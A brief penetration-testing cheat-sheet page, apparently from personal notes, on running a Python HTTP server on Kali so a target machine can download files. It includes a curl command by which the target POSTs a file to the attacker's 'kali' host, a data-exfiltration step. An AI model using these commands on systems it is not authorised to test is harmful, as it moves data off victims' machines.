---
title: "Upload Server"
---

# Upload Server

Python HTTP server for file transfer between Kali and the target. Serves files via GET and accepts uploads via POST with curl.

```shell
# Serve files (target downloads)
python3 -m http.server 80

# Receive a file sent by the target
curl -X POST http://kali/upload -F 'files=@file.txt'
```
